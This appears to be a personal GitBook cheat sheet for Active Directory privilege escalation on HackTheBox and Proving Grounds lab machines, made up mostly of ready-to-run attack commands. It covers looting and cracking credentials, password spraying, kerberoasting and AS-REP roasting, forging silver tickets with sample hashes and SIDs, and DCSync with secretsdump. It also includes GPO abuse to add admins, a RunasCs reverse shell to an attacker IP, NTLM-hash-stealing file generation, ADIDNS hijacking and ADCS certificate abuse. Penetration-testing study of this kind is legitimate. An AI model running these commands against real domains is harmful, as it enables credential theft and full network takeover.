# AD PrivEsc

{% hint style="info" %}
dc-ip you aclly gotta add the dc dns name too to hosts eg. dc.manager.htb or sum

printer config -> return \[HTB AD Easy]
{% endhint %}

{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" %}

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure></div>

{% embed url="https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg" %}
Ultimate AD Mindmap
{% endembed %}

## Fundamentals

### DC Full Name

{% hint style="info" %}
Hutch WIndows PG
{% endhint %}

Full name aka DC name would be hostname of computer + domain name ie. `hutchdc.hutch.offsec` \[bloodhound don't work without this]

### Looting

**Cached Credentials**

**Database Files**

* `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
* `keepass2john Database.kdbx > Keepasshash.txt`
* `john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt`

**PowerShell history**

* `Get-History`
* `(Get-PSReadlineOption).HistorySavePath`
* `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (Run for each user)

**Interesting Files**

* `cmdkey /list`
* In Users directories `Get-ChildItem -Path C:\Users\ -Include *.txt,*.log,*.xml,*.ini -File -Recurse -ErrorAction SilentlyContinue`
* On Filesystem `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
* `sysprep.*` `unattend.*`
* `Group Policies` `gpp-decrypt <hash>`

## Bloodhound

```
./SharpHound.exe --CollectionMethod All
bloodhound-python -u '[user]' -p '[password]' -d [domain] -dc [dc] -ns [ip] -c all
```

### Handy Tools

**SharpGPOAbuse - Modify Group Policy Objects**

{% hint style="info" %}
Vault \[PG AD] for manual enumeration whether we have perms and all GPOs available
{% endhint %}

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName [fake_GPO]
gpupdate /force
```

**RunasCs - If runas not there**

```
.\RunasCs.exe "[user]" '[password]' powershell.exe -r 10.10.14.2:9001
```

**gMSADumper - Reads any gMSA password blobs the user can access**

```
python3 gMSADumper.py -u '[user]' -p '[password]' -d [domain]
```

**pyLAPS - Read LAPS if user has the privilege**

```
python3 pyLAPS.py --action get -d "[domain]" -u "[user]" -p '[password]'
```

**NTLMTheft - Creates files that steal NTLM hashes if clicked on/accessed**

```
python ntlm_theft.py -g all -s 10.10.14.9 -f jtripz
```

## Rubeus

{% hint style="info" %}
defaultapppool user \[SeImpersonate no creds] from Flight \[HTB AD Hard] can perform DCSync using Rubeus
{% endhint %}

{% embed url="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/" %}

```
.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
.\Rubeus.exe klist

.\Rubeus.exe asktgt /user:Administrator /certificate:C:\Programdata\cert.pfx

.\Rubeus.exe tgtdeleg /nowrap [HTB FLight AD]

.\Rubeus.exe kerberoast /outfile:kerberoast
```

With our base64 encoded ticket.kirbi

```
base64 -d ticket.kirbi > ticket.kirbi_b64
python3 ticketConverter.py ticket.kirbi_b64 ticket.ccache
export KRB5CCNAME=./ticket.ccache
```

Confirm by `klist`, what you do next is upto you depending on perms obv - DCSync or psexec?

## Kerberos

```
./kerbrute_linux_amd64 passwordspray -d FRIZZ.HTB ~/htb/rooms/frizz/output.txt '!suBcig@MehTed!R' --dc 'FRIZZDC.FRIZZ.HTB'
./kerbrute_linux_amd64 userenum -d egotistical-bank.local  ~/htb/sauna/newuser.txt --dc egotistical-bank.local -v | grep 'VALID' 
```

### Silver Ticket (Service Accounts)

{% hint style="info" %}
Nagoya \[PG AD]
{% endhint %}

```
Get-Addomain
S-1-5-21-1969309164-1513403977-1686805993

SPN password hash (NT for Service1)
E3A0168BC21CFB88B95C954A5B18F57C

Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
MSSQL/nagoya.nagoya-industries.com

impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
export KRB5CCNAME=Administrator.ccache

mssqlclient.py -k nagoya.nagoya-industries.com
```

For auth using kerberos ticket

```
[libdefaults]
        default_realm = NAGOYA-INDUSTRIES.COM
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]

        NAGOYA-INDUSTRIES.COM = {
                kdc=nagoya.nagoya-industries.com
        }

[domain_realm]
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM

```

#### GetNPUsers - ASREP Roasting for users with no pre-auth

{% code title="18200" %}
```
python3 GetNPUsers.py [domain]/ -dc-ip [ip] -usersfile userlist.txt
./GetNPUsers.py -no-pass -dc-ip [ip] -request '[domain]/[user]'
```
{% endcode %}

#### GetUserSPN - find Service Principal Names and hash of associated user account

{% code title="13100" %}
```
python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] 
python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] -request <get ticket here>
```
{% endcode %}

#### DNSTool \[krbrelayx] - Edit  ADIDNS (AD Integrated DNS)

Regular users create child objects by default, attackers can leverage that and hijack traffic - no need to be DNS Admin for this

```
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.2 --type A 10.10.10.248
```

### Impacket

#### SecretsDump - Dump admin hashes if DCSync privileges enabled

```
sudo python3 secretsdump.py [domain]/[user]@[ip]
sudo python3 secretsdump.py -k -no-pass [host_domain] -just-dc-user [user] #Using KRB5CCNAME
```

#### getTGT - request a TGT and save it as ccache

```
python3 getTGT.py -dc-ip [ip] [domain]/'[user]':'[password]'
```

#### getST - request a Service Ticket and save it as ccache

```
python3 getST.py -spn [SPN] [-impersonate administrator] -hashes [hash] -dc-ip [ip] [domain]/[user]
```

#### PSexec - Semi shell that writes to $ADMIN share

You got a ticket for Admin? THis the place to be

```
export KRB5CCNAME=ticket.ccache; python3 psexec.py [domain]/[user]@[dc_domain] -k -no-pass
python3 psexec.py -hashes [hash] [user]@[ip] cmd.exe 
```

{% embed url="https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986" %}

#### TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files and vice-versa

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
./ticketConverter.py ticket.kirbi ticket.ccache
```

### AD CS (Certificate Service)

```
certipy-ad find -dc-ip [ip] -ns [ip] -u [user]@[domain] -p '[password]' -vulnerable -stdout
nxc ldap "domain_controller" -d "domain" -u "user" -p "password" -M adcs
.\Certify.exe find /vulnerable
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```
